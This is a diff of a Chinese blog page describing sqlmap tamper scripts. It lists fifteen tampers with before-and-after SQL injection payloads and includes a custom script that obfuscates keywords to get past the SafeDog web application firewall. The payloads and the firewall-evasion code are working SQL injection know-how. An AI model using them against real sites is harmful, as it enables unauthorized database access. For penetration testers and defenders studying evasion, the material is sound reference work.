@@ -292,39 +292,40 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="几个常用的tamper"><a href="#几个常用的tamper" class="headerlink" title="几个常用的tamper"></a>几个常用的tamper</h3><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h4><pre><code>适用数据库: All
+        <h3 id="几个常用的tamper">几个常用的tamper</h3>
+<h4 id="base64encode.py">base64encode.py</h4>
+<pre><code>适用数据库: All
 
 作用: 进行base64编码
 
 使用前: ` tamper(&quot;1&#39; AND SLEEP(5)#&quot;)`
 
-使用后: `&#39;MScgQU5EIFNMRUVQKDUpIw==&#39;`
-</code></pre>
-<br>
-
-<h4 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h4><pre><code>适用数据库: All
+使用后: `&#39;MScgQU5EIFNMRUVQKDUpIw==&#39;`</code></pre>
+<p><br></p>
+<h4 id="space2plus.py">space2plus.py</h4>
+<pre><code>适用数据库: All
 
 作用: 把空格替换为  `+`
 
 使用前:  `tamper(&#39;SELECT id FROM users&#39;)`
 
-使用后: `&#39;SELECT+id+FROM+users&#39;`
-</code></pre>
-<h4 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h4><pre><code>测试通过数据库： Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
+使用后: `&#39;SELECT+id+FROM+users&#39;`</code></pre>
+<h4 id="space2comment.py">space2comment.py</h4>
+<pre><code>测试通过数据库： Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
 
 作用: 把空格替换为` /**/`
 
 使用前: `tamper(&#39;SELECT id FROM users&#39;)`
 
-使用后: `&#39;SELECT/**/id/**/FROM/**/users&#39;`
-</code></pre>
-<h4 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h4><pre><code>作用:  把空格换为其他有效字符
+使用后: `&#39;SELECT/**/id/**/FROM/**/users&#39;`</code></pre>
+<h4 id="space2randomblank.py">space2randomblank.py</h4>
+<pre><code>作用:  把空格换为其他有效字符
 
 使用前:  `tamper(&#39;SELECT id FROM users&#39;)`
 
-使用后:  `&#39;SELECT%0Did%0CFROM%0Ausers&#39;`
-</code></pre>
-<h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h4><pre><code>适用数据库：MySQL
+使用后:  `&#39;SELECT%0Did%0CFROM%0Ausers&#39;`</code></pre>
+<h4 id="space2mysqlblank.py">space2mysqlblank.py</h4>
+<pre><code>适用数据库：MySQL
 
 测试通过数据库：MySQL 5.1
 
@@ -332,81 +333,77 @@
 
 使用前：`tamper(&#39;SELECT id FROM users&#39;)`
 
-使用后：`&#39;SELECT%A0id%0CFROM%0Dusers&#39;`
-</code></pre>
-<h4 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h4><pre><code>适用数据库：All
+使用后：`&#39;SELECT%A0id%0CFROM%0Dusers&#39;`</code></pre>
+<h4 id="space2dash.py">space2dash.py</h4>
+<pre><code>适用数据库：All
 
 作用：将空格替换为--，并添加一个随机字符串和换行符
 
 使用前：`tamper(&#39;1 AND 9227=9227&#39;)`
 
-使用后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`
-</code></pre>
-<br>
-
-<h4 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h4><pre><code>适用数据库:  All
+使用后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`</code></pre>
+<p><br></p>
+<h4 id="randomcomments.py">randomcomments.py</h4>
+<pre><code>适用数据库:  All
 
 作用: 使用注释符分割 SQL关键字
 
 使用前:  `tamper(&#39;INSERT&#39;)`
 
-使用后:  `I/**/NS/**/ERT`
-</code></pre>
-<h4 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h4><pre><code>作用: 将payload随机大小写
+使用后:  `I/**/NS/**/ERT`</code></pre>
+<h4 id="randomcase.py">randomcase.py</h4>
+<pre><code>作用: 将payload随机大小写
 
 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
 
 使用前: `tamper(&#39;SELECT id FROM `user`&#39;)`
 
-使用后:  `&#39;SeLeCt id FrOm `user`&#39;`
-</code></pre>
-<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h4><pre><code>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
+使用后:  `&#39;SeLeCt id FrOm `user`&#39;`</code></pre>
+<h4 id="charencode.py">charencode.py</h4>
+<pre><code>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
 
 作用: 对payload进行url编码
 
 使用前: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`
 
-使用后: `&#39;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#39;`
-</code></pre>
-<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h4><pre><code>适用数据库:  All
+使用后: `&#39;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#39;`</code></pre>
+<h4 id="chardoubleencode.py">chardoubleencode.py</h4>
+<pre><code>适用数据库:  All
 
 作用:  对payload进行二次url编码
 
 使用前: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`
 
-使用后: `&#39;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#39;`
-</code></pre>
-<h4 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h4><pre><code>适用数据库：All
+使用后: `&#39;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#39;`</code></pre>
+<h4 id="unmagicquotes.py">unmagicquotes.py</h4>
+<pre><code>适用数据库：All
 
 作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格
 
 使用前：`tamper(&quot;1&#39; AND 1=1&quot;)`
 
-使用后：`1%bf%27 AND 1=1--`
-</code></pre>
-<br>
-
-<h4 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h4><pre><code>适用数据库：All
+使用后：`1%bf%27 AND 1=1--`</code></pre>
+<p><br></p>
+<h4 id="nonrecursivereplacement.py">nonrecursivereplacement.py</h4>
+<pre><code>适用数据库：All
 
 作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）
 
 使用前：`tamper(&#39;1 UNION SELECT 2--&#39;)`
 
-使用后：`1 UNIOUNIONN SELESELECTCT 2--`
-</code></pre>
-<br>
-
-<h4 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h4><pre><code>适用数据库：All
+使用后：`1 UNIOUNIONN SELESELECTCT 2--`</code></pre>
+<p><br></p>
+<h4 id="securesphere.py">securesphere.py</h4>
+<pre><code>适用数据库：All
 
 作用：追加特定的字符串
 
 使用脚本前：`tamper(&#39;1 AND 1=1&#39;)`
 
-使用脚本后：`1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;`
-</code></pre>
-<br>
-
-<h4 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h4><pre><code>适用数据库：MySQL
+使用脚本后：`1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;`</code></pre>
+<p><br></p>
+<h4 id="modsecurityversioned.py">modsecurityversioned.py</h4>
+<pre><code>适用数据库：MySQL
 
 测试通过数据库：MySQL 5.0
 
@@ -414,32 +411,28 @@
 
 使用前：`tamper(&#39;1 AND 2&gt;1--&#39;)`
 
-使用后：`1 /*!30874AND 2&gt;1*/--`
-</code></pre>
-<br>
-
-<h4 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><pre><code>作用： 把等号替换为LIKE
+使用后：`1 /*!30874AND 2&gt;1*/--`</code></pre>
+<p><br></p>
+<h4 id="equaltolike.py">equaltolike.py</h4>
+<pre><code>作用： 把等号替换为LIKE
 
 使用前： `tamper(&#39;SELECT * FROM users WHERE id=1&#39;)`
 
-使用后：`&#39;SELECT * FROM users WHERE id LIKE 1&#39;`
-</code></pre>
-<br>
-
-<br>
-
-<h3 id="sqlmap-tamper编写"><a href="#sqlmap-tamper编写" class="headerlink" title="sqlmap tamper编写"></a>sqlmap tamper编写</h3><p>先看一个最简单的脚本</p>
+使用后：`&#39;SELECT * FROM users WHERE id LIKE 1&#39;`</code></pre>
+<p><br></p>
+<p><br></p>
+<h3 id="sqlmap-tamper编写">sqlmap tamper编写</h3>
+<p>先看一个最简单的脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Slash escape single and double quotes (e.g. &#x27; -&gt; \&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1&quot; AND SLEEP(5)#&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1\\\\&quot; AND SLEEP(5)#&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>共由三部分组成，priority变量定义和dependencies、tamper函数定义。</p>
 <p>priority 定义脚本的优先级，可用于多个tamper脚本的情况下</p>
 <p>dependencies函数声明脚本的适用范围和不适用范围，可以为空值</p>
-<p>tamper函数为主要函数，接受参数为payload 和**kwargs，这个脚本的返回值为替换后的payload，在这里引号被替换成了 <code>\\&#39;</code></p>
-<br>
-
+<p>tamper函数为主要函数，接受参数为payload
+和**kwargs，这个脚本的返回值为替换后的payload，在这里引号被替换成了
+<code>\\'</code></p>
+<p><br></p>
 <p>下面这个是利用内联注释和注释混淆绕安全狗的tamper，具体的可以根据情况稍作修改，进行替换</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;/*!*/=/*!*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;ORDER&quot;</span>,<span class="string">&quot;/*!ORDER/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;AND&quot;</span>,<span class="string">&quot;/*!AND/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;FROM&quot;</span>,<span class="string">&quot;/*!FROM/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;OR&quot;</span>,<span class="string">&quot;/*!OR/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UNION&quot;</span>,<span class="string">&quot;/*!UNION/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SELECT&quot;</span>,<span class="string">&quot;/*!SELECT/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;USER()&quot;</span>,<span class="string">&quot;/*!USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;DATABASE()&quot;</span>,<span class="string">&quot;/*!DATABASE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;VERSION()&quot;</span>,<span class="string">&quot;/*!VERSION/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SESSION_USER()&quot;</span>,<span class="string">&quot;/*!SESSION_USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;EXTRACTVALUE&quot;</span>,<span class="string">&quot;/*!EXTRACTVALUE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UPDATEXML&quot;</span>,<span class="string">&quot;/*!UPDATEXML/*!/*/**/*/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 
     </div>
 
@@ -569,7 +562,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%9A%84tamper"><span class="nav-number">1.</span> <span class="nav-text">几个常用的tamper</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#base64encode-py"><span class="nav-number">1.1.</span> <span class="nav-text">base64encode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2plus-py"><span class="nav-number">1.2.</span> <span class="nav-text">space2plus.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2comment-py"><span class="nav-number">1.3.</span> <span class="nav-text">space2comment.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2randomblank-py"><span class="nav-number">1.4.</span> <span class="nav-text">space2randomblank.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2mysqlblank-py"><span class="nav-number">1.5.</span> <span class="nav-text">space2mysqlblank.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2dash-py"><span class="nav-number">1.6.</span> <span class="nav-text">space2dash.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#randomcomments-py"><span class="nav-number">1.7.</span> <span class="nav-text">randomcomments.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#randomcase-py"><span class="nav-number">1.8.</span> <span class="nav-text">randomcase.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#charencode-py"><span class="nav-number">1.9.</span> <span class="nav-text">charencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chardoubleencode-py"><span class="nav-number">1.10.</span> <span class="nav-text">chardoubleencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unmagicquotes-py"><span class="nav-number">1.11.</span> <span class="nav-text">unmagicquotes.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nonrecursivereplacement-py"><span class="nav-number">1.12.</span> <span class="nav-text">nonrecursivereplacement.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#securesphere-py"><span class="nav-number">1.13.</span> <span class="nav-text">securesphere.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#modsecurityversioned-py"><span class="nav-number">1.14.</span> <span class="nav-text">modsecurityversioned.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#equaltolike-py"><span class="nav-number">1.15.</span> <span class="nav-text">equaltolike.py</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-tamper%E7%BC%96%E5%86%99"><span class="nav-number">2.</span> <span class="nav-text">sqlmap tamper编写</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%9A%84tamper"><span class="nav-number">1.</span> <span class="nav-text">几个常用的tamper</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#base64encode.py"><span class="nav-number">1.1.</span> <span class="nav-text">base64encode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2plus.py"><span class="nav-number">1.2.</span> <span class="nav-text">space2plus.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2comment.py"><span class="nav-number">1.3.</span> <span class="nav-text">space2comment.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2randomblank.py"><span class="nav-number">1.4.</span> <span class="nav-text">space2randomblank.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2mysqlblank.py"><span class="nav-number">1.5.</span> <span class="nav-text">space2mysqlblank.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2dash.py"><span class="nav-number">1.6.</span> <span class="nav-text">space2dash.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#randomcomments.py"><span class="nav-number">1.7.</span> <span class="nav-text">randomcomments.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#randomcase.py"><span class="nav-number">1.8.</span> <span class="nav-text">randomcase.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#charencode.py"><span class="nav-number">1.9.</span> <span class="nav-text">charencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chardoubleencode.py"><span class="nav-number">1.10.</span> <span class="nav-text">chardoubleencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unmagicquotes.py"><span class="nav-number">1.11.</span> <span class="nav-text">unmagicquotes.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nonrecursivereplacement.py"><span class="nav-number">1.12.</span> <span class="nav-text">nonrecursivereplacement.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#securesphere.py"><span class="nav-number">1.13.</span> <span class="nav-text">securesphere.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#modsecurityversioned.py"><span class="nav-number">1.14.</span> <span class="nav-text">modsecurityversioned.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#equaltolike.py"><span class="nav-number">1.15.</span> <span class="nav-text">equaltolike.py</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-tamper%E7%BC%96%E5%86%99"><span class="nav-number">2.</span> <span class="nav-text">sqlmap tamper编写</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -585,7 +578,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -633,7 +626,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -647,7 +640,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -658,7 +651,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -798,6 +791,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
